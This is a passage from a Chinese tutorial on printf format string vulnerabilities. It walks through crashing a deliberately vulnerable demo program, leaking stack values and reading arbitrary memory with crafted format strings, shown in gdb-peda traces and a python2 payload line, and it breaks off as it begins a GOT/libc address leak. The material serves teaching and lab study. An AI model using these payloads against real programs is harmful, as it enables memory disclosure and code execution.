<li><code>printf()</code> 函数自己可以发现不匹配吗？<ul>
<li><code>printf()</code> 函数从栈中取出参数，如果它需要 3 个，那它就取出 3 个。除非栈的边界被标记了，否则 <code>printf()</code> 是不会知道它取出的参数比提供给它的参数多了。然而并没有这样的标记。</li>
</ul>
</li>
</ul>
<h2 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h2><p>通过提供格式字符串，我们就能够控制格式化函数的行为。漏洞的利用主要有下面几种。</p>
<h3 id="使程序崩溃"><a href="#使程序崩溃" class="headerlink" title="使程序崩溃"></a>使程序崩溃</h3><p>格式化字符串漏洞通常要在程序崩溃时才会被发现，所以利用格式化字符串漏洞最简单的方式就是使进程崩溃。在 Linux 中，存取无效的指针会引起进程收到 <code>SIGSEGV</code> 信号，从而使程序非正常终止并产生核心转储。我们知道核心转储中存储了程序崩溃时的许多重要信息，这些信息正是攻击者所需要的。</p>
<p>利用类似下面的格式字符串即可触发漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s"</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>对于每一个 <code>%s</code>，<code>printf()</code> 都要从栈中获取一个数字，把该数字视为一个地址，然后打印出地址指向的内存内容，直到出现一个 NULL 字符。</p>
</li>
<li><p>因为不可能获取的每一个数字都是地址，数字所对应的内存可能并不存在。</p>
</li>
<li><p>还有可能获得的数字确实是一个地址，但是该地址是被保护的。</p>
</li>
</ul>
<h3 id="查看栈内容"><a href="#查看栈内容" class="headerlink" title="查看栈内容"></a>查看栈内容</h3><p>使程序崩溃只是验证漏洞的第一步，攻击者还可以利用格式化输出函数来获得内存的内容，为下一步漏洞利用做准备。我们已经知道了，格式化字符串函数会根据格式字符串从栈上取值。由于在 x86 上栈由高地址向低地址增长，而 <code>printf()</code> 函数的参数是以逆序被压入栈的，所以参数在内存中出现的顺序与在 <code>printf()</code> 调用时出现的顺序是一致的。</p>
<p>下面的演示我们都使用下面的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> format[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">int</span> arg1 = <span class="number">1</span>, arg2 = <span class="number">0x88888888</span>, arg3 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> arg4[<span class="number">10</span>] = <span class="string">"ABCD"</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, format);</span><br><span class="line">    <span class="built_in">printf</span>(format, arg1, arg2, arg3, arg4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">$ gcc -m32 -fno-stack-protector -no-pie fmt.c</span><br></pre></td></tr></table></figure>

<p>我们先输入 <code>b main</code> 设置断点，使用 <code>n</code> 往下执行，在 <code>call 0x56555460 &lt;__isoc99_scanf@plt&gt;</code> 处输入 <code>%08x.%08x.%08x.%08x.%08x</code>，然后使用 <code>c</code> 继续执行，即可输出结果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ n</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd584 (&quot;%08x.%08x.%08x.%08x.%08x&quot;)</span><br><span class="line">EBX: 0x56557000 --&gt; 0x1efc</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0xf7f9883c --&gt; 0x0</span><br><span class="line">ESI: 0xf7f96e68 --&gt; 0x1bad90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd618 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd550 --&gt; 0xffffd584 (&quot;%08x.%08x.%08x.%08x.%08x&quot;)</span><br><span class="line">EIP: 0x56555642 (&lt;main+133&gt;:    call   0x56555430 &lt;printf@plt&gt;)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x56555638 &lt;main+123&gt;:       push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x5655563b &lt;main+126&gt;:       lea    eax,[ebp-0x94]</span><br><span class="line">   0x56555641 &lt;main+132&gt;:       push   eax</span><br><span class="line">&#x3D;&gt; 0x56555642 &lt;main+133&gt;:       call   0x56555430 &lt;printf@plt&gt;</span><br><span class="line">   0x56555647 &lt;main+138&gt;:       add    esp,0x20</span><br><span class="line">   0x5655564a &lt;main+141&gt;:       sub    esp,0xc</span><br><span class="line">   0x5655564d &lt;main+144&gt;:       push   0xa</span><br><span class="line">   0x5655564f &lt;main+146&gt;:       call   0x56555450 &lt;putchar@plt&gt;</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0xffffd584 (&quot;%08x.%08x.%08x.%08x.%08x&quot;)</span><br><span class="line">arg[1]: 0x1</span><br><span class="line">arg[2]: 0x88888888</span><br><span class="line">arg[3]: 0xffffffff</span><br><span class="line">arg[4]: 0xffffd57a (&quot;ABCD&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd550 --&gt; 0xffffd584 (&quot;%08x.%08x.%08x.%08x.%08x&quot;)</span><br><span class="line">0004| 0xffffd554 --&gt; 0x1</span><br><span class="line">0008| 0xffffd558 --&gt; 0x88888888</span><br><span class="line">0012| 0xffffd55c --&gt; 0xffffffff</span><br><span class="line">0016| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)</span><br><span class="line">0020| 0xffffd564 --&gt; 0xffffd584 (&quot;%08x.%08x.%08x.%08x.%08x&quot;)</span><br><span class="line">0024| 0xffffd568 (&quot; RUV\327UUVT\332\377\367\001&quot;)</span><br><span class="line">0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x56555642 in main ()</span><br><span class="line">gdb-peda$ x&#x2F;10x $esp</span><br><span class="line">0xffffd550:     0xffffd584      0x00000001      0x88888888      0xffffffff</span><br><span class="line">0xffffd560:     0xffffd57a      0xffffd584      0x56555220      0x565555d7</span><br><span class="line">0xffffd570:     0xf7ffda54      0x00000001</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">00000001.88888888.ffffffff.ffffd57a.ffffd584</span><br></pre></td></tr></table></figure>

<p>格式化字符串 <code>0xffffd584</code> 的地址出现在内存中的位置恰好位于参数 <code>arg1</code>、<code>arg2</code>、<code>arg3</code>、<code>arg4</code> 之前。格式字符串 <code>%08x.%08x.%08x.%08x.%08x</code> 表示函数 <code>printf()</code> 从栈中取出 5 个参数并将它们以 8 位十六进制数的形式显示出来。格式化输出函数使用一个内部变量来标志下一个参数的位置。开始时，参数指针指向第一个参数（<code>arg1</code>）。随着每一个参数被相应的格式规范所耗用，参数指针的值也根据参数的长度不断递增。在显示完当前执行函数的剩余自动变量之后，<code>printf()</code> 将显示当前执行函数的栈帧（包括返回地址和参数等）。</p>
<p>当然也可以使用 <code>%p.%p.%p.%p.%p</code> 得到相似的结果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ n</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd584 (&quot;%p.%p.%p.%p.%p&quot;)</span><br><span class="line">EBX: 0x56557000 --&gt; 0x1efc</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0xf7f9883c --&gt; 0x0</span><br><span class="line">ESI: 0xf7f96e68 --&gt; 0x1bad90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd618 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd550 --&gt; 0xffffd584 (&quot;%p.%p.%p.%p.%p&quot;)</span><br><span class="line">EIP: 0x56555642 (&lt;main+133&gt;:    call   0x56555430 &lt;printf@plt&gt;)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x56555638 &lt;main+123&gt;:       push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x5655563b &lt;main+126&gt;:       lea    eax,[ebp-0x94]</span><br><span class="line">   0x56555641 &lt;main+132&gt;:       push   eax</span><br><span class="line">&#x3D;&gt; 0x56555642 &lt;main+133&gt;:       call   0x56555430 &lt;printf@plt&gt;</span><br><span class="line">   0x56555647 &lt;main+138&gt;:       add    esp,0x20</span><br><span class="line">   0x5655564a &lt;main+141&gt;:       sub    esp,0xc</span><br><span class="line">   0x5655564d &lt;main+144&gt;:       push   0xa</span><br><span class="line">   0x5655564f &lt;main+146&gt;:       call   0x56555450 &lt;putchar@plt&gt;</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0xffffd584 (&quot;%p.%p.%p.%p.%p&quot;)</span><br><span class="line">arg[1]: 0x1</span><br><span class="line">arg[2]: 0x88888888</span><br><span class="line">arg[3]: 0xffffffff</span><br><span class="line">arg[4]: 0xffffd57a (&quot;ABCD&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd550 --&gt; 0xffffd584 (&quot;%p.%p.%p.%p.%p&quot;)</span><br><span class="line">0004| 0xffffd554 --&gt; 0x1</span><br><span class="line">0008| 0xffffd558 --&gt; 0x88888888</span><br><span class="line">0012| 0xffffd55c --&gt; 0xffffffff</span><br><span class="line">0016| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)</span><br><span class="line">0020| 0xffffd564 --&gt; 0xffffd584 (&quot;%p.%p.%p.%p.%p&quot;)</span><br><span class="line">0024| 0xffffd568 (&quot; RUV\327UUVT\332\377\367\001&quot;)</span><br><span class="line">0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x56555642 in main ()</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584</span><br></pre></td></tr></table></figure>

<p>上面的方法都是依次获得栈中的参数，如果我们想要直接获得被指定的某个参数，则可以使用类似下面的格式字符串：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%&lt;arg#&gt;$&lt;format&gt;</span><br><span class="line"></span><br><span class="line">%n$x</span><br></pre></td></tr></table></figure>

<p>这里的 <code>n</code> 表示栈中格式字符串后面的第 <code>n</code> 个值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ n</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd584 (&quot;%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p&quot;)</span><br><span class="line">EBX: 0x56557000 --&gt; 0x1efc</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0xf7f9883c --&gt; 0x0</span><br><span class="line">ESI: 0xf7f96e68 --&gt; 0x1bad90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd618 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd550 --&gt; 0xffffd584 (&quot;%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p&quot;)</span><br><span class="line">EIP: 0x56555642 (&lt;main+133&gt;:    call   0x56555430 &lt;printf@plt&gt;)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x56555638 &lt;main+123&gt;:       push   DWORD PTR [ebp-0xc]</span><br><span class="line">   0x5655563b &lt;main+126&gt;:       lea    eax,[ebp-0x94]</span><br><span class="line">   0x56555641 &lt;main+132&gt;:       push   eax</span><br><span class="line">&#x3D;&gt; 0x56555642 &lt;main+133&gt;:       call   0x56555430 &lt;printf@plt&gt;</span><br><span class="line">   0x56555647 &lt;main+138&gt;:       add    esp,0x20</span><br><span class="line">   0x5655564a &lt;main+141&gt;:       sub    esp,0xc</span><br><span class="line">   0x5655564d &lt;main+144&gt;:       push   0xa</span><br><span class="line">   0x5655564f &lt;main+146&gt;:       call   0x56555450 &lt;putchar@plt&gt;</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0xffffd584 (&quot;%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p&quot;)</span><br><span class="line">arg[1]: 0x1</span><br><span class="line">arg[2]: 0x88888888</span><br><span class="line">arg[3]: 0xffffffff</span><br><span class="line">arg[4]: 0xffffd57a (&quot;ABCD&quot;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd550 --&gt; 0xffffd584 (&quot;%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p&quot;)</span><br><span class="line">0004| 0xffffd554 --&gt; 0x1</span><br><span class="line">0008| 0xffffd558 --&gt; 0x88888888</span><br><span class="line">0012| 0xffffd55c --&gt; 0xffffffff</span><br><span class="line">0016| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)</span><br><span class="line">0020| 0xffffd564 --&gt; 0xffffd584 (&quot;%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p&quot;)</span><br><span class="line">0024| 0xffffd568 (&quot; RUV\327UUVT\332\377\367\001&quot;)</span><br><span class="line">0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x56555642 in main ()</span><br><span class="line">gdb-peda$ x&#x2F;10w $esp</span><br><span class="line">0xffffd550:     0xffffd584      0x00000001      0x88888888      0xffffffff</span><br><span class="line">0xffffd560:     0xffffd57a      0xffffd584      0x56555220      0x565555d7</span><br><span class="line">0xffffd570:     0xf7ffda54      0x00000001</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">ffffffff.00000001.0x88888888.0x88888888.0xffffd57a.0xffffd584.0x56555220</span><br></pre></td></tr></table></figure>

<p>这里，格式字符串的地址为 <code>0xffffd584</code>。我们通过格式字符串 <code>%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p</code> 分别获取了 <code>arg3</code>、<code>arg1</code>、两个 <code>arg2</code>、<code>arg4</code> 和栈上紧跟参数的两个值。可以看到这种方法非常强大，可以获得栈中任意的值。</p>
<h3 id="查看任意地址的内存"><a href="#查看任意地址的内存" class="headerlink" title="查看任意地址的内存"></a>查看任意地址的内存</h3><p>攻击者可以使用一个“显示指定地址的内存”的格式规范来查看任意地址的内存。例如，使用 <code>%s</code> 显示参数　指针所指定的地址的内存，将它作为一个 ASCII 字符串处理，直到遇到一个空字符。如果攻击者能够操纵这个参数指针指向一个特定的地址，那么 <code>%s</code> 就会输出该位置的内存内容。</p>
<p>还是上面的程序，我们输入 <code>%4$s</code>，输出的 <code>arg4</code> 就变成了 <code>ABCD</code> 而不是地址 <code>0xffffd57a</code>：</p>
<p>上面的例子只能读取栈中已有的内容，如果我们想获取的是任意的地址的内容，就需要我们自己将地址写入到栈中。我们输入 <code>AAAA.%p</code> 这样的格式的字符串，观察一下栈有什么变化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd550 --&gt; 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)</span><br><span class="line">0004| 0xffffd554 --&gt; 0x1</span><br><span class="line">0008| 0xffffd558 --&gt; 0x88888888</span><br><span class="line">0012| 0xffffd55c --&gt; 0xffffffff</span><br><span class="line">0016| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)</span><br><span class="line">0020| 0xffffd564 --&gt; 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)</span><br><span class="line">0024| 0xffffd568 (&quot; RUV\327UUVT\332\377\367\001&quot;)</span><br><span class="line">0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x56555642 in main ()</span><br></pre></td></tr></table></figure>

<p>格式字符串的地址在 <code>0xffffd584</code>，从下面的输出中可以看到它们在栈中是怎样排布的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20w $esp</span><br><span class="line">0xffffd550:     0xffffd584      0x00000001      0x88888888      0xffffffff</span><br><span class="line">0xffffd560:     0xffffd57a      0xffffd584      0x56555220      0x565555d7</span><br><span class="line">0xffffd570:     0xf7ffda54      0x00000001      0x424135d0      0x00004443</span><br><span class="line">0xffffd580:     0x00000000      0x41414141      0x2e70252e      0x252e7025</span><br><span class="line">0xffffd590:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70</span><br><span class="line">gdb-peda$ x&#x2F;20wb 0xffffd584</span><br><span class="line">0xffffd584:     0x41    0x41    0x41    0x41    0x2e    0x25    0x70    0x2e</span><br><span class="line">0xffffd58c:     0x25    0x70    0x2e    0x25    0x70    0x2e    0x25    0x70</span><br><span class="line">0xffffd594:     0x2e    0x25    0x70    0x2e</span><br><span class="line">gdb-peda$ python print(&#39;\x2e\x25\x70&#39;)</span><br><span class="line">.%p</span><br></pre></td></tr></table></figure>

<p>下面是程序运行的结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">AAAA<span class="number">.0</span>x1<span class="number">.0</span>x88888888<span class="number">.0</span>xffffffff<span class="number">.0</span>xffffd57a<span class="number">.0</span>xffffd584<span class="number">.0</span>x56555220<span class="number">.0</span>x565555d7<span class="number">.0</span>xf7ffda54<span class="number">.0</span>x1<span class="number">.0</span>x424135d0<span class="number">.0</span>x4443.(nil)<span class="number">.0</span>x41414141<span class="number">.0</span>x2e70252e<span class="number">.0</span>x252e7025<span class="number">.0</span>x70252e70<span class="number">.0</span>x2e70252e<span class="number">.0</span>x252e7025<span class="number">.0</span>x70252e70<span class="number">.0</span>x2e70252e</span><br></pre></td></tr></table></figure>

<p><code>0x41414141</code> 是输出的第 13 个字符，所以我们使用 <code>%13$s</code> 即可读出 <code>0x41414141</code> 处的内容，当然，这里可能是一个不合法的地址。下面我们把 <code>0x41414141</code> 换成我们需要的合法的地址，比如字符串 <code>ABCD</code> 的地址 <code>0xffffd57a</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">$ python2 -c &#39;print(&quot;\x7a\xd5\xff\xff&quot;+&quot;.%13$s&quot;)&#39; &gt; text</span><br><span class="line">$ gdb -q a.out</span><br><span class="line">Reading symbols from a.out...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ b printf</span><br><span class="line">Breakpoint 1 at 0x8048350</span><br><span class="line">gdb-peda$ r &lt; text</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd584 --&gt; 0xffffd57a (&quot;ABCD&quot;)</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0xf7f9883c --&gt; 0x0</span><br><span class="line">ESI: 0xf7f96e68 --&gt; 0x1bad90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd618 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd54c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)</span><br><span class="line">EIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)</span><br><span class="line">EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e27c1b &lt;fprintf+27&gt;:     ret</span><br><span class="line">   0xf7e27c1c:  xchg   ax,ax</span><br><span class="line">   0xf7e27c1e:  xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243</span><br><span class="line">   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc</span><br><span class="line">   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]</span><br><span class="line">   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd54c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)</span><br><span class="line">0004| 0xffffd550 --&gt; 0xffffd584 --&gt; 0xffffd57a (&quot;ABCD&quot;)</span><br><span class="line">0008| 0xffffd554 --&gt; 0x1</span><br><span class="line">0012| 0xffffd558 --&gt; 0x88888888</span><br><span class="line">0016| 0xffffd55c --&gt; 0xffffffff</span><br><span class="line">0020| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)</span><br><span class="line">0024| 0xffffd564 --&gt; 0xffffd584 --&gt; 0xffffd57a (&quot;ABCD&quot;)</span><br><span class="line">0028| 0xffffd568 --&gt; 0x80481fc --&gt; 0x38 (&#39;8&#39;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e27c20 in printf () from &#x2F;usr&#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">gdb-peda$ x&#x2F;20w $esp</span><br><span class="line">0xffffd54c:     0x08048520      0xffffd584      0x00000001      0x88888888</span><br><span class="line">0xffffd55c:     0xffffffff      0xffffd57a      0xffffd584      0x080481fc</span><br><span class="line">0xffffd56c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0</span><br><span class="line">0xffffd57c:     0x00004443      0x00000000      0xffffd57a      0x3331252e</span><br><span class="line">0xffffd58c:     0x00007324      0xffffd5ca      0x00000001      0x000000c2</span><br><span class="line">gdb-peda$ x&#x2F;s 0xffffd57a</span><br><span class="line">0xffffd57a:     &quot;ABCD&quot;</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">z���.ABCD</span><br></pre></td></tr></table></figure>

<p>当然这也没有什么用，我们真正经常用到的地方是，把程序中某函数的 GOT 地址传进去，然后获得该地址所对应的函数的虚拟地址。然后根据函数在 libc 中的相对位置，计算出我们需要的函数地址（如 <code>system()</code>）。如下面展示的这样：</p>
<p>先看一下重定向表：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -r a.out</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">'.rel.dyn'</span> at offset 0x2e8 contains 1 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ffc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">'.rel.plt'</span> at offset 0x2f0 contains 4 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span 